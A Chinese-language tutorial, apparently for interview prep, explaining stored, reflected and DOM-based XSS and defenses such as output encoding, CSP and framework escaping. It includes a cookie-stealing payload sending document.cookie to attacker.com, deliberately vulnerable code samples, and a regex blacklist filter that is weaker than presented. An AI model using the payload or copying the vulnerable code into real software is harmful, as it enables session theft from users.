# XSS：浏览器里的幽灵

你在一个博客网站留言：「感谢分享，这篇文章写得真好！」
几天后，你发现账号被盗了。

你没有点击任何钓鱼链接，密码也没泄露。问题出在哪？

问题出在你那条看似无害的留言——里面藏着一段**恶意脚本**。当其他用户查看留言时，这段脚本悄悄执行，偷走了他们的登录凭证。

这就是 **XSS（Cross-Site Scripting，跨站脚本攻击）**——Web 安全最常见的漏洞之一。

## XSS 的本质

XSS 的本质是**把用户输入当代码执行**。

正常情况下，用户输入应该被当作「数据」处理。但如果没有妥善处理，攻击者可以注入自己的**JavaScript 代码**，这段代码会在受害者的浏览器中执行。

```
正常流程：
用户输入 → 当作文本处理 → 显示为文字

XSS 漏洞：
用户输入（包含 <script>） → 被当作 HTML/JS 解析 → 脚本执行
```

## XSS 的三种类型

### 1. 存储型 XSS（Stored XSS）

最危险的类型，恶意代码被永久存储在服务器端：

```
攻击流程：
1. 攻击者在博客留言区提交恶意脚本
2. 服务器未过滤，直接存入数据库
3. 其他用户访问该页面
4. 页面加载时，恶意脚本随内容一起返回
5. 脚本在受害者浏览器中执行
```

```java
// 漏洞代码示例
@PostMapping("/comment")
public Result addComment(@RequestBody CommentRequest request) {
    Comment comment = new Comment();
    comment.setContent(request.getContent());  // 直接存储，未过滤
    comment.setUserId(currentUserId);
    commentRepository.save(comment);
    return Result.success();
}

// JSP 模板
<div class="comment">
    ${comment.content}  <!-- 直接输出，存在 XSS -->
</div>
```

**攻击示例**：
```
用户输入：
<script>
    document.location='https://attacker.com/steal?cookie='+document.cookie;
</script>
```

### 2. 反射型 XSS（Reflected XSS）

恶意脚本通过 URL 参数「反射」回来：

```java
// 漏洞代码示例
@GetMapping("/search")
public String search(@RequestParam String keyword, Model model) {
    model.addAttribute("keyword", keyword);  // 直接返回，未过滤
    return "search";
}
```

```
攻击流程：
1. 攻击者构造恶意 URL
   https://site.com/search?keyword=<script>alert('XSS')</script>

2. 引诱受害者点击这个 URL

3. 服务器把 keyword 参数值反射回页面
   <input value="<script>alert('XSS')</script>">

4. 页面解析时，script 标签闭合 input，开始执行恶意代码
```

### 3. DOM 型 XSS（DOM-based XSS）

纯前端漏洞，恶意代码通过 JavaScript 操作 DOM 注入：

```javascript
// 漏洞代码示例
const params = new URLSearchParams(window.location.search);
const keyword = params.get('keyword');
document.getElementById('result').innerHTML = '搜索：' + keyword;
// 如果 keyword 是 <img src=x onerror=alert('XSS')>，就会执行
```

## XSS 的危害

XSS 一旦成功，攻击者可以做：

```
┌─────────────────────────────────────────────────────────────┐
│                    XSS 能做什么                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Cookie/Session 窃取                                      │
│     document.cookie 获取登录凭证                              │
│                                                             │
│  2. 键盘记录器                                               │
│     监听用户输入，窃取密码、信用卡号                           │
│                                                             │
│  3. 钓鱼攻击                                                 │
│     注入伪造登录框，偷取用户账号密码                           │
│                                                             │
│  4. 蠕虫传播                                                 │
│     自动传播恶意脚本，感染更多用户                             │
│                                                             │
│  5. 修改页面内容                                             │
│     篡改网站内容，传播虚假信息                                 │
│                                                             │
│  6. 内网探测                                                 │
│     利用浏览器发起内网请求，探测内网结构                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## XSS 防御：输入过滤与输出编码

### 1. 输入验证与过滤

```java
/**
 * XSS 过滤器：移除危险标签和属性
 */
@Component
public class XssFilter implements Filter {
    
    private static final Pattern SCRIPT_PATTERN = Pattern.compile(
        "<script[^>]*>.*?</script>",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL
    );
    
    private static final Pattern EVENT_PATTERN = Pattern.compile(
        "on\\w+\\s*=",
        Pattern.CASE_INSENSITIVE
    );
    
    private static final Pattern IFRAME_PATTERN = Pattern.compile(
        "<iframe[^>]*>.*?</iframe>",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL
    );
    
    @Override
    public String filter(String input) {
        if (input == null) {
            return null;
        }
        
        String filtered = input;
        
        // 移除 script 标签
        filtered = SCRIPT_PATTERN.matcher(filtered).replaceAll("");
        
        // 移除事件属性
        filtered = EVENT_PATTERN.matcher(filtered).replaceAll("");
        
        // 移除 iframe
        filtered = IFRAME_PATTERN.matcher(filtered).replaceAll("");
        
        // HTML 实体编码
        filtered = encodeHtml(filtered);
        
        return filtered;
    }
    
    private String encodeHtml(String input) {
        return input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;");
    }
}
```

### 2. Spring Security Header 配置

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // XSS Header 防护
            .headers(headers -> headers
                // 内容安全策略（CSP）
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; " +
                        "script-src 'self' 'nonce-{random}'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data:;")
                )
                // X-Content-Type-Options
                .contentTypeOptions(contentType -> {})
                // X-Frame-Options
                .frameOptions(frame -> frame.deny())
            );
        return http.build();
    }
}
```

### 3. Thymeleaf 模板自动转义

```html
<!-- Thymeleaf 默认自动转义 -->
<div th:text="${comment.content}">
    <!-- 自动进行 HTML 转义，<script> 变成 &lt;script&gt; -->
</div>

<!-- 如果需要输出原始 HTML（谨慎使用） -->
<div th:utext="${comment.content}">
    <!-- 不转义，仅在完全信任来源时使用 -->
</div>
```

### 4. Vue/React 的自动防护

现代前端框架默认防护 XSS：

```javascript
// Vue 自动转义插值
<template>
    <div>{{ userInput }}</div>
    <!-- 自动转义，不执行 -->
</template>

// React 自动转义
function App() {
    return <div>{userInput}</div>;  // 自动转义
}

// 危险： dangerouslySetHTML（绝对不要用用户输入）
function App() {
    return <div dangerouslySetInnerHTML={{__html: userInput}} />;
    // ❌ 危险！等于 innerHTML = 用户输入
}
```

## Content Security Policy（CSP）

CSP 是 XSS 防御的终极手段：

```html
<!-- CSP 响应头 -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self';">

<!-- CSP 指令 -->
<!-- default-src: 默认源 -->
<!-- script-src: JavaScript 源 -->
<!-- style-src: CSS 源 -->
<!-- img-src: 图片源 -->
<!-- connect-src: AJAX/WebSocket 源 -->
<!-- frame-src: iframe 源 -->
```

```
CSP 示例：
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
```

## 面试追问方向

1. **存储型 XSS 和反射型 XSS 的区别？** —— 存储型永久存在服务器，反射型通过 URL 参数
2. **XSS 和 CSRF 的区别？** —— XSS 执行在受害者浏览器（偷数据），CSRF 在受害者浏览器（发请求）
3. **HttpOnly Cookie 能防 XSS 吗？** —— 不能防 XSS 执行，但能防 JavaScript 读取 Cookie
4. **innerHTML 和 textContent 的区别？** —— innerHTML 解析 HTML，textContent 只当文本
5. **CSP 为什么能防 XSS？** —— 禁止执行内联脚本，即使注入脚本也会被浏览器拦截

> "XSS 是 Web 安全的万恶之源。理解它的原理和防御手段，是每个 Web 开发者的必修课。"
